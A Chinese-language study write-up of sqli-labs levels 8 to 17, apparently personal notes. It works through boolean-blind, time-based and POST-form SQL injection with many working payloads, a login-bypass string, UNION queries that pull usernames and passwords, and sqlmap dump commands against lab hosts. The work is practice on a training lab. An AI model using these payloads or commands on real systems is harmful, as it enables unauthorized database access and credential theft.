`?id=1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'security' limit 0,1),1,1))=105 --+`

![image-20250306154214359](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306154214359.png)

第一列第一个字符为 `i` 

继续第二个 `d`

`?id=1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'security' limit 0,1),2,1))=100 --+`

![image-20250306154322748](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306154322748.png)

依次求第二列：

`?id=1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'security' limit 1,1),1,1))=117 --+`

![image-20250306154641678](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306154641678.png)

第一个字符：`u`

可以得到:
**第二列名：username
第三列名：password**

**获取表中的数据**

获取条数

`?id=1' and (select count(*) from users)=13--+`

![image-20250306154910713](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306154910713.png)

看到是13条

**判断数据长度**

`?id=1' and length((select id from users limit 0,1))=1--+`

![image-20250306155138663](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306155138663.png)

可以看到这里的id是从1开始的

**判断username长度**

`?id=1' amd length((select username from users limit 0,1))=4--+`

![image-20250306155324553](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306155324553.png)

**判断username的第一个数据**

`?id=1' and ascii(substr((select username from users limit 0,1),1,1))=68 --+`

![image-20250306155511789](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306155511789.png)

可以看到username中的第一个字符是 `D`

然后按照依次可以得到

username：`Dumb`

password：`Dumb`

**！！！这真的是很复杂啊**

**用SQLMAP扫一下**

![image-20250306162713096](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306162713096.png)

![image-20250306162730916](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306162730916.png)

**sqlmap神力！！！**



## **==9. Less-9 GET - Blind - Time based. - Single Quotes==**

`?id=1`

![image-20250306163159832](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306163159832.png)

`?id=1'`

![image-20250306163214115](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306163214115.png)

`id=1"`

![image-20250306163238210](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306163238210.png)

**这里发现语句不论对错都不会报错，使用延时注入，使用sleep()函数**

`?id=1' and sleep(5)--+`

![image-20250306163503726](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306163503726.png)

发现延时了五秒，转换思路，MySql的sleep()函数能够起到休眠的作用。

注入上面的参数响应时间明显增加，并且主观上也能够感受到延迟。这是明显基于 **时间盲注** 的字符型Sql注入漏洞，我们需要使用sleep()函数制造时间差进行注入。

**获取数据库信息**

注入流程和Less 5类型，不过这里的判断标准不是回显的信息，而是响应时间。MySql的if语句允许根据表达式佛如某个条件或值结果来执行一组SQL语句，语法如下，当表达式expr为真时，返回value1的值，否则返回value2。

```
IF(expr,value1,value2)
```

此处因为无法回显任何东西，因此 `order by`子句失效。我们使用 `IF` 语句结合`length()`函数对数据库名长度进行判断，如果猜测正确则令响应时间长一点。

`?id=1' and if(length(database())<10,sleep(5),1)--+`

![image-20250306165603036](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306165603036.png)

猜测数据库名长度小于10时响应时间超过，所以数据库名长度小于10。

`?id=1' and if(length(database())=8,sleep(5),1)--+`

![image-20250306165525087](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306165525087.png)

结果得出数据库长度为8

使用left() 函数判断数据库名的第一位是否是字符a

`?id=1' and if(left((select database()),1)='a',sleep(5),1)--+`

![image-20250306170251422](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306170251422.png)

`?id=1' and if(left((select database()),1)='s',sleep(5),1)--+`

![image-20250306170317339](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306170317339.png)

这里我慢慢试，得出数据库名的第一个字符为 `s`

感觉这里可以用ascii(substr())函数，先用二分法，比一个个试快

**得出数据库名**

`?id=1' and if(left((select database()),8)='security',sleep(5),1)--+`

![image-20250306170724082](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306170724082.png)

这样就可以爆出表名，字段名及其剩余信息

照样试试sqlmap

`sudo sqlmap http://localhost/sqli/Less-9/?id=1 --dbs --dump --batch`

![image-20250306171218905](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306171218905.png)

![image-20250306171226908](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306171226908.png)

![image-20250306171236740](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306171236740.png)

![image-20250306171246096](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306171246096.png)

![image-20250306171256845](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306171256845.png)

![image-20250306171305348](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306171305348.png)



## **==10. Less-10 GET - Blind - Time based. - Double Quotes==**

把第九关的 `'` 换成 `"` 就行了



## **==11.Less-11 POST-Error Based -Single Quotes-String==**

![image-20250308145825331](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308145825331.png)

这关是post的方式上传到服务器的

![image-20250308151043997](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308151043997.png)

我们首先在输入框里面随便输入账号密码，可以看到URL里无任何变化，所以这关是POST传递。

但是不管是怎么传递，数据在传输到后台的处理是相同的，后台sql语句照样可以被我们修改。

这种页面我们就可以试下默认密码

账户：`admin`

密码：`admin`

![image-20250308153812846](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308153812846.png)

下一步我们要试下怎么用sql注入

`admin'`:`123`

![image-20250308153937156](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308153937156.png)

**1.猜测闭合符**有报错，说明是字符型注入，可以看到123被 `'` 括住，说明是单引号闭合型

接下来输入 `admin'#`:`123`

![image-20250308154057926](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308154057926.png)

万能密码：`admin' or '1'='1--+`:`123456`

![image-20250308155046620](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308155046620.png)

**2。查询列数**接下来，我们要试试查询列数

`ada order by 3#`:`''`

![image-20250308162031236](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308162031236.png)

`'order by 2#`

![image-20250308160008058](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308160008058.png)

这就没报错了，说明是两列。

**3.找显示位**

`' union select 1,2#`

![image-20250308160338369](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308160338369.png)

**4.查库名**

`' union select 1,database()#`

![image-20250308160501216](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308160501216.png)

**5.查表名**

`' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#`

![image-20250308160912264](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308160912264.png)

![image-20250308161734335](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308161734335.png)

**6.查列名**

`' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'#` 

![image-20250308162212719](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308162212719.png)

**7.找账号密码**

`' union select 1,group_concat(concat_ws(",",username,password) separator "|") from users #`

![image-20250308162621518](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308162621518.png)

用sqlmap

`sqlmap -r '/home/kali/Desktop/ports.txt' -p n --dbs --batch`

![image-20250308205511529](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308205511529.png)

![image-20250308210046566](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308210046566.png)

这也是爆出来的

另外一种方法：`sqlmap -u http://localhost/sqli/Less-11 --data="uname=admin*&passwd=123456&submit=Submin" --dbs --batch`

![image-20250308210308364](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308210308364.png)

前面找到 `security`这个数据库，

`sqlmap -r "/home/kali/Desktop/ports.txt" -p n --dbms mysql -D security --tables --batch`

![image-20250308230707632](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308230707632.png)

下我们找到了users这张表，下面找他有什么列

`sqlmap -r "/home/kali/Desktop/ports.txt" -p n --dbms mysql -D security -T users --column --batch`

![image-20250308230959558](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308230959558.png)

下面我们接着往下挖

`sqlmap -r "/home/kali/Desktop/ports.txt" --dbms mysql -D security -T users --dump --batch`

![image-20250308231719142](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250308231719142.png)



## **==12.Less 12:PORT Error Based Double quotes String with twist==**

![image-20250311163107067](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311163107067.png)

![image-20250311163218967](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311163218967.png)

可以看到弱密码是可以的

1.判断注入类型

`uname=admin'&passwd=admin&submit=Submit`

![image-20250311163435111](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311163435111.png)

直接用 `sqlmap`

`sudo sqlmap -r less13.txt -p n --dbs --batch`

![image-20250311170747390](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311170747390.png)

![image-20250311170809452](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311170809452.png)

`sudo sqlmap -r less13.txt -p n --dbms mysql -D security --tables --batch`

![image-20250311171030858](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311171030858.png)

`sudo sqlmap -r less13.txt -p n --dbms mysql -D security -T users --columns --batch`

![image-20250311171229598](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311171229598.png)

`sudo sqlmap -r less13.txt -p n --dbms mysql -D security -T users --dump --batch`

![image-20250311171358657](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311171358657.png)

15.Less15 基于时间的盲注，要注好久的

![image-20250311173811307](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250311173811307.png)

16.Less16 基于时间的盲注，这次需要提高扫描等级

`sudo sqlmap -u http://192.168.137.133/sqli/Less-16 --data="uname=admin&passwd=admin&submit=Submit" --level 2 --dbs --batch`

`sudo -r less-16.txt --level 2 --dbs --batch` 



**==17.Less17 POST Update Query Error Based String==**

这关的难点是有两个SQL语句，其中一个进行了强效的过滤，我们得想办法发现第二个注入点，同时该关卡可以使用报错注入进行攻击。
